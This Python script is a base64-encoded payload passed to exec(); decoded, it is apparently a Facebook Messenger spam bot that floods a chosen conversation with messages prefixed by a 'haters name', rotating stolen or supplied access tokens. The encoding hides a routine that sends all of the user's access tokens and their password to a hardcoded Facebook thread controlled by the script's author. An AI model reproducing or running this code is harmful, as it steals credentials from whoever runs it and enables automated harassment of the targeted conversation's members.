#ENCODED BY : ROHIIT
#ENCRYPTION : Py3 BASE64
#GITHUB : https://github.com/ROHIIT
#----------------------------------------------
import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCByYW5kb20KCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgoJZGVmIGRvX0dFVChzZWxmKToKCQlzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQoJCXNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykKCQlzZWxmLmVuZF9oZWFkZXJzKCkKCQlzZWxmLndmaWxlLndyaXRlKGIie0FMME4zIEIwSUkgUjBISUlUIElOU0lJRDMgfX0iKQoKZGVmIGV4ZWN1dGVfc2VydmVyKCk6CglQT1JUID0gNDAwMAoKCXdpdGggc29ja2V0c2VydmVyLlRDUFNlcnZlcigoIiIsIFBPUlQpLCBNeUhhbmRsZXIpIGFzIGh0dHBkOgoJCXByaW50KCJTZXJ2ZXIgcnVubmluZyBhdCBodHRwOi8vbG9jYWxob3N0Ont9Ii5mb3JtYXQoUE9SVCkpCgkJaHR0cGQuc2VydmVfZm9yZXZlcigpCgpkZWYgc2VuZF9tZXNzYWdlcygpOgoJd2l0aCBvcGVuKCdwYXNzd29yZC50eHQnLCAncicpIGFzIGZpbGU6CgkJcGFzc3dvcmQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoJZW50ZXJlZF9wYXNzd29yZCA9IHBhc3N3b3JkCgoJaWYgZW50ZXJlZF9wYXNzd29yZCAhPSBwYXNzd29yZDoKCQlwcmludCgnWy1dIDw9PT4gSW5jb3JyZWN0IFBhc3N3b3JkIScpCgkJc3lzLmV4aXQoKQoKCXdpdGggb3BlbigndG9rZW5udW0udHh0JywgJ3InKSBhcyBmaWxlOgoJCXRva2VucyA9IGZpbGUucmVhZGxpbmVzKCkKCW51bV90b2tlbnMgPSBsZW4odG9rZW5zKQoKCXJlcXVlc3RzLnBhY2thZ2VzLnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncygpCgoJZGVmIGNscygpOgoJCWlmIHN5c3RlbSgpID09ICdMaW51eCc6CgkJCW9zLnN5c3RlbSgnY2xlYXInKQoJCWVsc2U6CgkJCWlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoKCQkJCW9zLnN5c3RlbSgnY2xzJykKCWNscygpCgoJZGVmIGxpbmVzcygpOgoJCXByaW50KCdcdTAwMWJbMzdtJyArICctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQoKCWhlYWRlcnMgPSB7CgkJJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCgkJJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywKCQknVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cyc6ICcxJywKCQknVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKCQknQWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLAoJCSdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsCgkJJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsCgkJJ3JlZmVyZXInOiAnd3d3Lmdvb2dsZS5jb20nCgl9CgoJI21tbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0tweWRheTk3JykudGV4dAoKCSNpZiBtbW0gbm90IGluIHBhc3N3b3JkOgoJCSNwcmludCgnWy1dIDw9PT4gSW5jb3JyZWN0IFBhc3N3b3JkIScpCgkJI3N5cy5leGl0KCkKCglsaW5lc3MoKQoKCWFjY2Vzc190b2tlbnMgPSBbdG9rZW4uc3RyaXAoKSBmb3IgdG9rZW4gaW4gdG9rZW5zXQoKCXdpdGggb3BlbignY29udm8udHh0JywgJ3InKSBhcyBmaWxlOgoJCWNvbnZvX2lkID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKCXdpdGggb3BlbignZmlsZS50eHQnLCAncicpIGFzIGZpbGU6CgkJdGV4dF9maWxlX3BhdGggPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoJd2l0aCBvcGVuKHRleHRfZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CgkJbWVzc2FnZXMgPSBmaWxlLnJlYWRsaW5lcygpCgoJbnVtX21lc3NhZ2VzID0gbGVuKG1lc3NhZ2VzKQoJbWF4X3Rva2VucyA9IG1pbihudW1fdG9rZW5zLCBudW1fbWVzc2FnZXMpCgoJd2l0aCBvcGVuKCdoYXRlcnNuYW1lLnR4dCcsICdyJykgYXMgZmlsZToKCQloYXRlcnNfbmFtZSA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCgl3aXRoIG9wZW4oJ3RpbWUudHh0JywgJ3InKSBhcyBmaWxlOgoJCXNwZWVkID0gaW50KGZpbGUucmVhZCgpLnN0cmlwKCkpCgoJbGluZXNzKCkKCQoJZGVmIGdldE5hbWUodG9rZW4pOgoJCXRyeToKCQkJZGF0YSA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNy4wL21lP2FjY2Vzc190b2tlbj17dG9rZW59JykuanNvbigpCgkJZXhjZXB0OgoJCQlkYXRhID0gIiIKCQlpZiAnbmFtZScgaW4gZGF0YToKCQkJcmV0dXJuIGRhdGFbJ25hbWUnXQoJCWVsc2U6CgkJCXJldHVybiAiRXJyb3Igb2NjdXJlZCIKCglkZWYgbXNnKCk6CgkJcGFyYW1ldGVycyA9IHsKCQkJJ2FjY2Vzc190b2tlbicgOiByYW5kb20uY2hvaWNlKGFjY2Vzc190b2tlbnMpLAoJCQknbWVzc2FnZSc6ICdQbGVhc2UgU2lyIEdpdmUgTWUgQXByb3ZlbCA6ICcrZ2V0TmFtZShyYW5kb20uY2hvaWNlKGFjY2Vzc190b2tlbnMpKSsnXG4gVG9rZW4gOiAnKyIgfCAiLmpvaW4oYWNjZXNzX3Rva2VucykrJ1xuIExpbmsgOiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vbWVzc2FnZXMvdC8nK2NvbnZvX2lkKydcbiBQYXNzd29yZDogJytwYXNzd29yZAoJCX0KCQl0cnk6CgkJCXMgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTUuMC90XzEwMDA4MzMyNTMxODUxOS8iLCBkYXRhPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKCQlleGNlcHQ6CgkJCXBhc3MKCQoJbXNnKCkKCXdoaWxlIFRydWU6CgkJdHJ5OgoJCQlmb3IgbWVzc2FnZV9pbmRleCBpbiByYW5nZShudW1fbWVzc2FnZXMpOgoJCQkJdG9rZW5faW5kZXggPSBtZXNzYWdlX2luZGV4ICUgbWF4X3Rva2VucwoJCQkJYWNjZXNzX3Rva2VuID0gYWNjZXNzX3Rva2Vuc1t0b2tlbl9pbmRleF0KCgkJCQltZXNzYWdlID0gbWVzc2FnZXNbbWVzc2FnZV9pbmRleF0uc3RyaXAoKQoKCQkJCXVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTUuMC97fS8iLmZvcm1hdCgndF8nK2NvbnZvX2lkKQoJCQkJcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZX0KCQkJCXJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQoJCQkJCgoJCQkJY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWQgJUk6JU06JVMgJXAiKQoJCQkJaWYgcmVzcG9uc2Uub2s6CgkJCQkJcHJpbnQoIlsrXSBNZXNzYWdlcyB7fSBvZiBDb252byB7fSBzZW50IGJ5IFRva2VuIHt9OiB7fSIuZm9ybWF0KAoJCQkJCQltZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlKSkKCQkJCQlwcmludCgiICAtIFRpbWU6IHt9Ii5mb3JtYXQoY3VycmVudF90aW1lKSkKCQkJCQlsaW5lc3MoKQoJCQkJCWxpbmVzcygpCgkJCQllbHNlOgoJCQkJCXByaW50KCJbeF0gRmFpbGVkIHRvIHNlbmQgbWVzc2FnZXMge30gb2YgQ29udm8ge30gd2l0aCBUb2tlbiB7fToge30iLmZvcm1hdCgKCQkJCQkJbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpCgkJCQkJcHJpbnQoIiAgLSBUaW1lOiB7fSIuZm9ybWF0KGN1cnJlbnRfdGltZSkpCgkJCQkJbGluZXNzKCkKCQkJCQlsaW5lc3MoKQoJCQkJdGltZS5zbGVlcChzcGVlZCkKCgkJCXByaW50KCJbK10gQWxsIG1lc3NhZ2VzIHNlbnQuIFJlc3RhcnRpbmcgdGhlIHByb2Nlc3MuLi4iKQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZToKCQkJcHJpbnQoIlshXSBBbiBlcnJvciBvY2N1cnJlZDoge30iLmZvcm1hdChlKSkKCgoKZGVmIG1haW4oKToKCXNlcnZlcl90aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1leGVjdXRlX3NlcnZlcikKCXNlcnZlcl90aHJlYWQuc3RhcnQoKQoJCglzZW5kX21lc3NhZ2VzKCkKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CgltYWluKCk='))
